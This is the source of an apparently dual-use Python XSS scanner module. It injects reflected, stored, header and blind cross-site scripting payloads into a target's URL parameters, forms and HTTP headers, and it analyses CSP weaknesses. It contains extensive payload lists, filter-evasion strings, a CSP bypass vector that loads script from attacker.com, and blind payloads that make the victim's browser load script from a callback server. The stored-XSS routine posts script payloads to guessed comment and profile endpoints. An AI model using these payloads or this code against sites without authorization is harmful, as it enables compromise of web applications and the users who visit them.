"""
Vexor XSS Scanner v3.0 - Elite Level
Reflected, Stored, DOM, Blind, mXSS, CSP Bypass, Filter Evasion
Context-aware payloads, unique marker confirmation, header injection
"""
import asyncio
import re
import random
import string
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
from vexor.modules.base import BaseScanner, Finding


# ─── Context-Aware Payloads ───────────────────────────────────────────────────
CONTEXT_PAYLOADS = {
    "html": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<video src=x onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<body onload=alert(1)>",
        "<marquee onstart=alert(1)>",
    ],
    "attribute": [
        '" onmouseover="alert(1)',
        "' onmouseover='alert(1)",
        '" autofocus onfocus="alert(1)',
        "' autofocus onfocus='alert(1)",
        '" onclick="alert(1)',
        "' onclick='alert(1)",
        '" onerror="alert(1)',
    ],
    "javascript": [
        "';alert(1)//",
        '";alert(1)//',
        "\\';alert(1)//",
        "</script><script>alert(1)</script>",
        "'-alert(1)-'",
        '"-alert(1)-"',
        "`-alert(1)-`",
    ],
    "url": [
        "javascript:alert(1)",
        "javascript:alert(1)//",
        "data:text/html,<script>alert(1)</script>",
    ],
}

# ─── Filter Bypass Payloads ───────────────────────────────────────────────────
FILTER_BYPASS_PAYLOADS = [
    "<ScRiPt>alert(1)</ScRiPt>",
    "<SCRIPT>alert(1)</SCRIPT>",
    "<scr<!---->ipt>alert(1)</scr<!---->ipt>",
    "%253Cscript%253Ealert(1)%253C/script%253E",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    "<svg><script>alert(1)</script></svg>",
    "<svg/onload=alert(1)>",
    "<img src=1 onerror=alert(1)>",
    "<img/src=x/onerror=alert(1)>",
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "#{7*7}",
    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
    "jaVasCript:alert(1)",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    "<a href=javascript:alert(1)>click</a>",
    "<form action=javascript:alert(1)><input type=submit>",
]

# ─── DOM Sources and Sinks ────────────────────────────────────────────────────
DOM_SOURCES = [
    "document.URL", "document.documentURI", "document.URLUnencoded",
    "document.baseURI", "location.href", "location.hash", "location.search",
    "document.cookie", "document.referrer", "window.name",
    "localStorage.getItem", "sessionStorage.getItem",
]

DOM_SINKS = [
    "eval(", "innerHTML", "outerHTML", "document.write(",
    "document.writeln(", "setTimeout(", "setInterval(",
    "execScript(", "window.location", "location.href",
    "location.replace(", "location.assign(",
    "insertAdjacentHTML(", "createContextualFragment(",
    ".html(", "$(", "jQuery(",
]

# ─── Headers to test ─────────────────────────────────────────────────────────
XSS_HEADERS = [
    "User-Agent",
    "Referer",
    "X-Forwarded-For",
    "X-Forwarded-Host",
    "Accept-Language",
    "Cookie",
]


class Scanner(BaseScanner):
    """XSS Scanner v3.0 - Elite Level"""

    MODULE_NAME = "xss"
    MODULE_DESC = "XSS: Reflected/Stored/DOM/Blind/mXSS/CSP-Bypass/Filter-Evasion"

    async def scan(self) -> list[Finding]:
        async with self:
            await asyncio.gather(
                self._scan_reflected(),
                self._scan_stored(),
                self._scan_dom(),
                self._scan_headers(),
                self._scan_csp(),
                self._scan_blind(),
                return_exceptions=True,
            )
        return self.findings

    # ─── Helpers ─────────────────────────────────────────────────────────────

    def _make_marker(self) -> str:
        """Generate unique marker for payload confirmation"""
        return "VEXOR" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))

    def _detect_context(self, html: str, marker: str) -> str:
        """Detect injection context: html, attribute, javascript, url"""
        idx = html.find(marker)
        if idx == -1:
            return "html"
        before = html[max(0, idx - 200):idx]

        # In script block?
        script_opens = len(re.findall(r"<script[^>]*>", before, re.IGNORECASE))
        script_closes = len(re.findall(r"</script>", before, re.IGNORECASE))
        if script_opens > script_closes:
            return "javascript"

        # In attribute?
        last_tag_match = re.search(r"<[^>]*$", before)
        if last_tag_match:
            tag_content = last_tag_match.group(0)
            # URL attribute?
            if re.search(r"(href|src|action|data)\s*=\s*[\"']?[^\"']*$", tag_content, re.IGNORECASE):
                return "url"
            # Generic attribute?
            if "=" in tag_content:
                return "attribute"

        return "html"

    def _is_xss_reflected(self, response_text: str, payload: str, marker: str) -> bool:
        """Check if payload is reflected unencoded (not HTML-escaped)"""
        if marker not in response_text:
            return False
        # Check if payload is HTML-encoded (safe)
        encoded_lt = payload.replace("<", "&lt;")
        encoded_lt2 = payload.replace("<", "&#60;")
        encoded_lt3 = payload.replace("<", "%3C")
        if encoded_lt in response_text and payload not in response_text:
            return False
        if encoded_lt2 in response_text and payload not in response_text:
            return False
        return True

    async def _send(self, url: str, param: str, payload: str, method: str, base_data: dict):
        """Send payload via GET or POST"""
        try:
            if method == "POST":
                data = dict(base_data)
                data[param] = payload
                return await self.post(url, data=data)
            else:
                return await self.get(self._inject_param(url, param, payload))
        except Exception:
            return None

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        """Inject payload into URL parameter"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [payload]
        return urlunparse(parsed._replace(query=urlencode(params, doseq=True)))

    # ─── Reflected XSS ───────────────────────────────────────────────────────

    async def _scan_reflected(self) -> None:
        """Test all parameters for reflected XSS"""
        response = await self.get(self.target)
        if not response:
            return

        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)

        if not params:
            common = ["q", "search", "id", "name", "query", "s", "keyword", "term", "input", "text"]
            params = {p: ["test"] for p in common}

        # Test URL params
        for param in params:
            await self._test_param_xss(self.target, param, "GET", {})

        # Test POST forms
        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, "lxml")
            for form in soup.find_all("form"):
                action = form.get("action", "")
                method = form.get("method", "get").upper()
                form_url = urljoin(self.target, action) if action else self.target
                form_data = {}
                for inp in form.find_all(["input", "textarea"]):
                    name = inp.get("name", "")
                    if name:
                        form_data[name] = inp.get("value", "test")
                for name in form_data:
                    await self._test_param_xss(form_url, name, method, form_data)
        except Exception:
            pass

    async def _test_param_xss(self, url: str, param: str, method: str, base_data: dict) -> None:
        """Test a single parameter for XSS with context detection"""
        marker = self._make_marker()

        # Probe: inject marker to detect reflection and context
        probe_resp = await self._send(url, param, marker, method, base_data)
        if not probe_resp or marker not in probe_resp.text:
            return  # Not reflected at all

        context = self._detect_context(probe_resp.text, marker)

        # Get context-specific + filter bypass payloads
        payloads = CONTEXT_PAYLOADS.get(context, CONTEXT_PAYLOADS["html"])
        all_payloads = payloads + FILTER_BYPASS_PAYLOADS

        for payload in all_payloads:
            try:
                marked_payload = payload.replace("alert(1)", f"alert('{marker}')")
                resp = await self._send(url, param, marked_payload, method, base_data)
                if not resp:
                    continue

                if self._is_xss_reflected(resp.text, marked_payload, marker):
                    severity = "CRITICAL" if context == "javascript" else "HIGH"
                    self.add_finding(Finding(
                        severity=severity,
                        module=self.MODULE_NAME,
                        vuln=f"Reflected XSS ({context} context)",
                        endpoint=url,
                        param=param,
                        payload=payload,
                        evidence=(
                            f"Context: {context}\n"
                            f"Marker '{marker}' reflected unencoded\n"
                            f"Payload: {payload[:120]}"
                        ),
                        description=(
                            f"Reflected XSS in parameter '{param}' ({context} context). "
                            "Attacker can execute arbitrary JavaScript in victim's browser "
                            "by sending a crafted URL."
                        ),
                        remediation=(
                            "HTML-encode all output using context-aware encoding. "
                            "Implement Content-Security-Policy header. "
                            "Use framework-provided output encoding functions."
                        ),
                    ))
                    return
            except Exception:
                continue

    # ─── Stored XSS ──────────────────────────────────────────────────────────

    async def _scan_stored(self) -> None:
        """Test for stored XSS by submitting payloads and checking retrieval pages"""
        marker = self._make_marker()
        stored_payload = f"<script>alert('{marker}')</script>"

        stored_endpoints = [
            (self.target, "POST"),
            (urljoin(self.target, "/comment"), "POST"),
            (urljoin(self.target, "/comments"), "POST"),
            (urljoin(self.target, "/post"), "POST"),
            (urljoin(self.target, "/review"), "POST"),
            (urljoin(self.target, "/feedback"), "POST"),
            (urljoin(self.target, "/profile"), "POST"),
            (urljoin(self.target, "/message"), "POST"),
            (urljoin(self.target, "/api/comment"), "POST"),
            (urljoin(self.target, "/api/post"), "POST"),
        ]

        retrieval_urls = [
            self.target,
            urljoin(self.target, "/"),
            urljoin(self.target, "/comments"),
            urljoin(self.target, "/posts"),
            urljoin(self.target, "/profile"),
            urljoin(self.target, "/dashboard"),
            urljoin(self.target, "/home"),
        ]

        for endpoint, method in stored_endpoints:
            for field in ["comment", "message", "content", "body", "text", "name", "title", "description"]:
                try:
                    data = {field: stored_payload}
                    submit_resp = await self.post(endpoint, data=data)
                    if not submit_resp or submit_resp.status_code not in [200, 201, 302]:
                        continue

                    for ret_url in retrieval_urls:
                        try:
                            ret_resp = await self.get(ret_url)
                            if ret_resp and marker in ret_resp.text:
                                if self._is_xss_reflected(ret_resp.text, stored_payload, marker):
                                    self.add_finding(Finding(
                                        severity="CRITICAL",
                                        module=self.MODULE_NAME,
                                        vuln="Stored XSS",
                                        endpoint=endpoint,
                                        param=field,
                                        payload=stored_payload,
                                        evidence=(
                                            f"Stored at: {endpoint} (field: {field})\n"
                                            f"Triggered at: {ret_url}\n"
                                            f"Marker '{marker}' found unencoded"
                                        ),
                                        description=(
                                            f"Stored XSS via field '{field}' at {endpoint}. "
                                            "Payload persists and executes for ALL visitors."
                                        ),
                                        remediation=(
                                            "HTML-encode all stored user input before rendering. "
                                            "Implement CSP. Use DOMPurify for rich text content."
                                        ),
                                    ))
                                    return
                        except Exception:
                            continue
                except Exception:
                    continue

    # ─── DOM XSS ─────────────────────────────────────────────────────────────

    async def _scan_dom(self) -> None:
        """Analyze JavaScript for DOM XSS source-to-sink flows"""
        response = await self.get(self.target)
        if not response:
            return

        text = response.text
        found_sources = [s for s in DOM_SOURCES if s in text]
        found_sinks = [s for s in DOM_SINKS if s in text]

        # Check for source-to-sink flows (proximity-based)
        dangerous_flows = []
        for source in found_sources:
            for sink in found_sinks:
                src_idx = text.find(source)
                sink_idx = text.find(sink)
                if src_idx != -1 and sink_idx != -1 and abs(src_idx - sink_idx) < 500:
                    dangerous_flows.append(f"{source} -> {sink}")

        if dangerous_flows:
            self.add_finding(Finding(
                severity="HIGH",
                module=self.MODULE_NAME,
                vuln="DOM XSS — Source-to-Sink Flow Detected",
                endpoint=self.target,
                evidence=(
                    "Dangerous flows:\n" + "\n".join(dangerous_flows[:5]) +
                    f"\nSources: {', '.join(found_sources[:5])}\n"
                    f"Sinks: {', '.join(found_sinks[:5])}"
                ),
                description=(
                    "DOM XSS: user-controlled sources flow into dangerous sinks. "
                    "Attacker can inject JavaScript via URL parameters or fragment."
                ),
                remediation=(
                    "Use textContent instead of innerHTML. "
                    "Sanitize with DOMPurify before DOM insertion. "
                    "Avoid eval() and document.write()."
                ),
            ))
        elif found_sinks:
            self.add_finding(Finding(
                severity="MEDIUM",
                module=self.MODULE_NAME,
                vuln="DOM XSS — Dangerous Sinks Present",
                endpoint=self.target,
                evidence=f"Sinks found: {', '.join(found_sinks[:8])}",
                description="Dangerous JavaScript sinks detected. Manual review required.",
                remediation="Review all DOM manipulation for unsanitized user input.",
            ))

        # Hash-based DOM XSS
        if "location.hash" in text or "window.location.hash" in text:
            for sink in ["innerHTML", "document.write(", "eval("]:
                if sink in text:
                    self.add_finding(Finding(
                        severity="HIGH",
                        module=self.MODULE_NAME,
                        vuln="DOM XSS — Hash-Based (location.hash -> sink)",
                        endpoint=self.target + "#<img src=x onerror=alert(1)>",
                        evidence=f"location.hash flows into {sink}",
                        description=(
                            "URL fragment (#) flows into dangerous sink. "
                            "Attacker crafts URL with XSS payload in fragment."
                        ),
                        remediation="Sanitize location.hash before DOM insertion.",
                    ))
                    break

        # Check inline event handlers in HTML
        inline_handlers = re.findall(
            r'on\w+\s*=\s*["\']?[^"\'>\s]+["\']?',
            text, re.IGNORECASE
        )
        if len(inline_handlers) > 5:
            self.add_finding(Finding(
                severity="LOW",
                module=self.MODULE_NAME,
                vuln="DOM XSS — Excessive Inline Event Handlers",
                endpoint=self.target,
                evidence=f"Found {len(inline_handlers)} inline event handlers",
                description=(
                    "Many inline event handlers detected. "
                    "If any accept user input, DOM XSS is possible."
                ),
                remediation="Use addEventListener instead of inline handlers. Implement CSP.",
            ))

    # ─── Header XSS ──────────────────────────────────────────────────────────

    async def _scan_headers(self) -> None:
        """Test HTTP headers for XSS reflection"""
        marker = self._make_marker()
        payload = f"<script>alert('{marker}')</script>"

        for header in XSS_HEADERS:
            try:
                resp = await self.get(self.target, headers={header: payload})
                if resp and marker in resp.text:
                    if self._is_xss_reflected(resp.text, payload, marker):
                        self.add_finding(Finding(
                            severity="HIGH",
                            module=self.MODULE_NAME,
                            vuln=f"Reflected XSS in HTTP Header ({header})",
                            endpoint=self.target,
                            param=header,
                            payload=payload,
                            evidence=f"Header '{header}' value reflected unencoded in response",
                            description=(
                                f"XSS via {header} header. "
                                "Header value is reflected in response without encoding."
                            ),
                            remediation=(
                                "Encode all HTTP header values before reflecting in responses. "
                                "Implement CSP."
                            ),
                        ))
            except Exception:
                continue

    # ─── CSP Analysis ────────────────────────────────────────────────────────

    async def _scan_csp(self) -> None:
        """Analyze Content-Security-Policy for weaknesses and bypass vectors"""
        response = await self.get(self.target)
        if not response:
            return

        headers = {k.lower(): v for k, v in response.headers.items()}
        csp = headers.get("content-security-policy", "")

        if not csp:
            self.add_finding(Finding(
                severity="MEDIUM",
                module=self.MODULE_NAME,
                vuln="Missing Content-Security-Policy Header",
                endpoint=self.target,
                evidence="No CSP header found",
                description=(
                    "No CSP header. XSS attacks have no browser-level mitigation. "
                    "All XSS payloads will execute without restriction."
                ),
                remediation=(
                    "Add CSP: Content-Security-Policy: "
                    "default-src 'self'; script-src 'self'; "
                    "object-src 'none'; base-uri 'self'"
                ),
            ))
            return

        issues = []
        bypasses = []

        if "unsafe-inline" in csp:
            issues.append("unsafe-inline allows inline scripts")
            bypasses.append("<script>alert(1)</script> executes directly")

        if "unsafe-eval" in csp:
            issues.append("unsafe-eval allows eval()")
            bypasses.append("eval('alert(1)') executes")

        if re.search(r"script-src[^;]*\*", csp):
            issues.append("Wildcard (*) in script-src allows any script")
            bypasses.append("<script src=//attacker.com/xss.js></script>")

        if "data:" in csp:
            issues.append("data: URI allowed in CSP")
            bypasses.append("<script src=data:,alert(1)></script>")

        if not re.search(r"object-src\s*'none'", csp):
            issues.append("object-src not restricted (Flash/plugin XSS possible)")

        if not re.search(r"base-uri\s*'none'|base-uri\s*'self'", csp):
            issues.append("base-uri not restricted (base tag injection possible)")

        if re.search(r"script-src[^;]*https:", csp) and "unsafe-inline" not in csp:
            issues.append("Broad HTTPS in script-src may allow JSONP bypass")

        if issues:
            severity = "HIGH" if "unsafe-inline" in csp else "MEDIUM"
            self.add_finding(Finding(
                severity=severity,
                module=self.MODULE_NAME,
                vuln=f"Weak Content-Security-Policy ({len(issues)} issues)",
                endpoint=self.target,
                evidence=(
                    f"CSP: {csp[:200]}\n\n"
                    "Issues:\n" + "\n".join(f"- {i}" for i in issues) +
                    ("\n\nBypass vectors:\n" + "\n".join(f"- {b}" for b in bypasses) if bypasses else "")
                ),
                description=(
                    f"CSP has {len(issues)} weakness(es) allowing XSS bypass. "
                    f"Issues: {', '.join(issues[:3])}"
                ),
                remediation=(
                    "Remove unsafe-inline/unsafe-eval. "
                    "Use nonces or hashes for inline scripts. "
                    "Restrict script-src to specific trusted domains. "
                    "Add object-src 'none' and base-uri 'self'."
                ),
            ))

    # ─── Blind XSS ───────────────────────────────────────────────────────────

    async def _scan_blind(self) -> None:
        """Plant blind XSS payloads that phone home via callback server"""
        callback_url = None
        try:
            from vexor.core.callback_server import get_callback_server
            cb = get_callback_server()
            if cb.is_running():
                _, callback_url = cb.generate_token(
                    vuln_type="xss",
                    target=self.target,
                    param="blind_xss",
                )
        except Exception:
            pass

        if not callback_url:
            return

        blind_payloads = [
            f'<script src="{callback_url}"></script>',
            f'"><script src="{callback_url}"></script>',
            f"'><script src='{callback_url}'></script>",
            (
                f'<img src=x onerror="var s=document.createElement(\'script\');'
                f's.src=\'{callback_url}\';document.head.appendChild(s)">'
            ),
        ]

        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)
        if not params:
            params = {"q": ["test"], "search": ["test"]}

        for param in list(params.keys())[:3]:
            for payload in blind_payloads[:2]:
                try:
                    await self._send(self.target, param, payload, "GET", {})
                except Exception:
                    continue

        # Plant in headers too
        for header in ["User-Agent", "Referer"]:
            for payload in blind_payloads[:1]:
                try:
                    await self.get(self.target, headers={header: payload})
                except Exception:
                    continue